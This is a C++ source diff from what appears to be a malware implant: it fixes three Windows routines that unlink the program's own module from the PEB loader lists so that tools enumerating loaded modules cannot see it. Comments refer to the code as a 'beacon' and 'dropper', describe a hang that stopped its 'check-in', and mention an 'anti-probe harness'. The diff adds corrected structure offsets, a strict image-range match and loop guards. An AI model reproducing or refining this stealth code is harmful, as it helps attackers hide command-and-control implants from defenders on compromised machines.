@@ -37,33 +37,41 @@ inline bool unlink_from_memory_order() {
 #endif
     if (!peb || !peb->Ldr) return false;
 
-    // InMemoryOrderModuleList is the 2nd list in PEB_LDR_DATA.
-    // LDR_DATA_STRUCTURE layout (x64):
-    //   +0x00 Length
-    //   +0x08 Initialized
-    //   +0x10 SsHandle
-    //   +0x18 InLoadOrderModuleList
-    //   +0x28 InMemoryOrderModuleList
-    //   +0x38 InInitializationOrderModuleList
+    // REAL x64 PEB_LDR_DATA layout (verified live 2026-10-17):
+    //   +0x00 Length (ULONG)   +0x04 Initialized   +0x08 SsHandle
+    //   +0x10 InLoadOrderModuleList
+    //   +0x20 InMemoryOrderModuleList
+    //   +0x30 InInitializationOrderModuleList
+    // LIVE BUG (2026-10-17, this host): the heads used to be read at
+    // +0x18/+0x28/+0x38 — 8 bytes PAST each real list head — so the walk
+    // crossed the real head (e != head was never true: the sentinel sat 8
+    // bytes too high) and cycled the list forever: 100% CPU, no check-in,
+    // reproducible in the dropper AND in the anti-probe harness. The
+    // termination now has a hard iteration cap plus a self-loop break, so
+    // no future layout mistake can hang the beacon again.
     auto ldr = peb->Ldr;
-    auto* inMemoryHead = reinterpret_cast<PLIST_ENTRY>(
-        reinterpret_cast<uint8_t*>(ldr) + 0x28);
+    auto* head = reinterpret_cast<PLIST_ENTRY>(
+        reinterpret_cast<uint8_t*>(ldr) + 0x20);
 
     // Find our own module entry. The InMemoryOrderLinks field sits at
     // offset 0x10 into the LDR_DATA_TABLE_ENTRY (for the memory-order list).
-    // We identify "ours" as the entry whose DllBase matches our image base.
+    // We identify "ours" by strict containment inside a registered image.
     uintptr_t ourBase = reinterpret_cast<uintptr_t>(&unlink_from_memory_order);
 
-    for (PLIST_ENTRY e = inMemoryHead->Flink; e != inMemoryHead; e = e->Flink) {
+    PLIST_ENTRY e = head->Flink;
+    for (int guard = 0; e != head && guard < 4096; ++guard, e = e->Flink) {
         // LDR_DATA_TABLE_ENTRY* = entry - 0x10 (InMemoryOrderLinks offset)
         auto* entry = reinterpret_cast<uint8_t*>(e) - 0x10;
-        // DllBase is at +0x30
+        // DllBase is at +0x30, SizeOfImage (ULONG) at +0x40
         uintptr_t dllBase = *reinterpret_cast<uintptr_t*>(entry + 0x30);
+        uint32_t imageSize = *reinterpret_cast<uint32_t*>(entry + 0x40);
 
-        // Match by containing address: our function pointer must fall inside
-        // this module's image range. A conservative check: compare high bits
-        // and require ourBase >= dllBase (within 1GB of the base).
-        if (dllBase && ourBase >= dllBase && (ourBase - dllBase) < 0x40000000ULL) {
+        // Strict containment: only OUR OWN registered image may match. The
+        // old "within 1 GB below the base" heuristic could unlink a STRANGER
+        // module; and for an in-memory payload (never registered as a
+        // module) the correct answer is "not listed" -> no unlink at all.
+        if (dllBase && imageSize && ourBase >= dllBase &&
+            ourBase < dllBase + imageSize) {
             // Unlink: Flink->Blink = Blink; Blink->Flink = Flink
             PLIST_ENTRY flink = e->Flink;
             PLIST_ENTRY blink = e->Blink;
@@ -74,6 +82,7 @@ inline bool unlink_from_memory_order() {
             e->Blink = e;
             return true;
         }
+        if (e->Flink == e) break;  // corrupted list: never spin
     }
     return false;
 }
@@ -88,17 +97,20 @@ inline bool unlink_from_load_order() {
     if (!peb || !peb->Ldr) return false;
 
     auto ldr = peb->Ldr;
-    auto* inLoadHead = reinterpret_cast<PLIST_ENTRY>(
-        reinterpret_cast<uint8_t*>(ldr) + 0x18);
+    auto* head = reinterpret_cast<PLIST_ENTRY>(
+        reinterpret_cast<uint8_t*>(ldr) + 0x10);  // real InLoadOrder head
 
     uintptr_t ourBase = reinterpret_cast<uintptr_t>(&unlink_from_load_order);
 
-    for (PLIST_ENTRY e = inLoadHead->Flink; e != inLoadHead; e = e->Flink) {
+    PLIST_ENTRY e = head->Flink;
+    for (int guard = 0; e != head && guard < 4096; ++guard, e = e->Flink) {
         // InLoadOrderLinks is at offset 0x00 of LDR_DATA_TABLE_ENTRY
         auto* entry = reinterpret_cast<uint8_t*>(e) - 0x00;
         uintptr_t dllBase = *reinterpret_cast<uintptr_t*>(entry + 0x30);
+        uint32_t imageSize = *reinterpret_cast<uint32_t*>(entry + 0x40);
 
-        if (dllBase && ourBase >= dllBase && (ourBase - dllBase) < 0x40000000ULL) {
+        if (dllBase && imageSize && ourBase >= dllBase &&
+            ourBase < dllBase + imageSize) {
             PLIST_ENTRY flink = e->Flink;
             PLIST_ENTRY blink = e->Blink;
             flink->Blink = blink;
@@ -107,6 +119,7 @@ inline bool unlink_from_load_order() {
             e->Blink = e;
             return true;
         }
+        if (e->Flink == e) break;  // corrupted list: never spin
     }
     return false;
 }
@@ -121,17 +134,20 @@ inline bool unlink_from_init_order() {
     if (!peb || !peb->Ldr) return false;
 
     auto ldr = peb->Ldr;
-    auto* inInitHead = reinterpret_cast<PLIST_ENTRY>(
-        reinterpret_cast<uint8_t*>(ldr) + 0x38);
+    auto* head = reinterpret_cast<PLIST_ENTRY>(
+        reinterpret_cast<uint8_t*>(ldr) + 0x30);  // real InInitOrder head
 
     uintptr_t ourBase = reinterpret_cast<uintptr_t>(&unlink_from_init_order);
 
-    for (PLIST_ENTRY e = inInitHead->Flink; e != inInitHead; e = e->Flink) {
+    PLIST_ENTRY e = head->Flink;
+    for (int guard = 0; e != head && guard < 4096; ++guard, e = e->Flink) {
         // InInitializationOrderLinks is at offset 0x20 of LDR_DATA_TABLE_ENTRY
         auto* entry = reinterpret_cast<uint8_t*>(e) - 0x20;
         uintptr_t dllBase = *reinterpret_cast<uintptr_t*>(entry + 0x30);
+        uint32_t imageSize = *reinterpret_cast<uint32_t*>(entry + 0x40);
 
-        if (dllBase && ourBase >= dllBase && (ourBase - dllBase) < 0x40000000ULL) {
+        if (dllBase && imageSize && ourBase >= dllBase &&
+            ourBase < dllBase + imageSize) {
             PLIST_ENTRY flink = e->Flink;
             PLIST_ENTRY blink = e->Blink;
             flink->Blink = blink;
@@ -140,6 +156,7 @@ inline bool unlink_from_init_order() {
             e->Blink = e;
             return true;
         }
+        if (e->Flink == e) break;  // corrupted list: never spin
     }
     return false;
 }
